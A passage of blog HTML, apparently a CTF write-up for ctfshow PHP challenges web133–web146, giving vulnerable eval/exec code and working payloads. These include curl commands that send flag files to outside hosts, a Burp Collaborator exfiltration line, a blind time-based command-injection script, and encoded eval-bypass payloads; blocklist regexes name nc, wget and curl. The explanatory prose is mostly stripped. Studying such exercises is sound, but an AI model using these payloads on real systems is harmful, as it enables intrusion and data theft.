class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get   F=`$F `;sleep 3</span><br><span class=\"line\">substr($F,0,6)   `$F `;</span><br><span class=\"line\"> eval(&quot;`$F `;&quot;);</span><br><span class=\"line\">$F</span><br><span class=\"line\">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class=\"line\">  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\"> sleep 3</span><br><span class=\"line\"> RCE</span><br></pre></td></tr></table></figure>\n\n<p>shell curl <br> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl  http://xxx:4567?p=`tac f*`</span><br></pre></td></tr></table></figure>\n\n<p>ipbp</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key1 = 0;</span><br><span class=\"line\">$key2 = 0;</span><br><span class=\"line\">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class=\"line\">    die(&quot;nonononono&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class=\"line\">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>extract</code></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">var_dump($_POST);</span><br><span class=\"line\">// _POST[a]=123</span><br><span class=\"line\">array(1) &#123; [&quot;a&quot;]=&gt; string(3) 123 &#125;</span><br><span class=\"line\">$_POST[a]123</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web135\"><a href=\"#web135\" class=\"headerlink\" title=\"web135\"></a>web135</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?F=`$F` ;cp flag.php 2.txt;</span><br><span class=\"line\">?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>linuxtee</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls|tee 1.txt</span><br><span class=\"line\">ls / |tee 1.txt</span><br><span class=\"line\">cat /f* |1.txt</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]); </span><br></pre></td></tr></table></figure>\n\n<p>ctfshowgetFlag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>\n\n<p>yu22x</p>\n<blockquote>\n<p>php -&gt;:: <br>-&gt;<br>::.</p>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class=\"line\">    die(&quot;private function&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>call_user_func</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class=\"line\"> classname say_hello</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import string</span><br><span class=\"line\">str=string.digits+string.ascii_lowercase+&quot;-&quot;</span><br><span class=\"line\">result=&quot;&quot;</span><br><span class=\"line\">key=0</span><br><span class=\"line\">for j in range(1,45):</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">    if key==1:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    for n in str:</span><br><span class=\"line\">        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class=\"line\">        #print(payload)</span><br><span class=\"line\">        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            requests.get(url,timeout=(2.5,2.5))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            result=result+n</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class=\"line\">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class=\"line\">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class=\"line\">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class=\"line\">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class=\"line\">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class=\"line\">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>,null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = eval(&quot;return $f1($f2());&quot;); </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(phpinfo())</span><br><span class=\"line\">md5(sleep())</span><br><span class=\"line\">md5(md5())</span><br><span class=\"line\">current(localeconv)</span><br><span class=\"line\">sha1(getcwd())     /var/www/html md5sha1</span><br></pre></td></tr></table></figure>\n\n<p>null</p>\n<h3 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>/^\\W+$/</code> ,</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>\n\n<p><code>phpinfo()</code> <code>1-phpinfo();</code>phpinfo()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1-phpinfo();&quot;);//</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1))&#123;</span><br><span class=\"line\">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class=\"line\">        sleep($d);</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>v1=0</code><code>$d=0</code></p>\n<h3 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return strlen($str)===1?true:false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>v1,v2,v3</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web155\"><a href=\"#web155\" class=\"headerlink\" title=\"web155\"></a>web155</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>yu22xwp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n<p>phpinfo()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        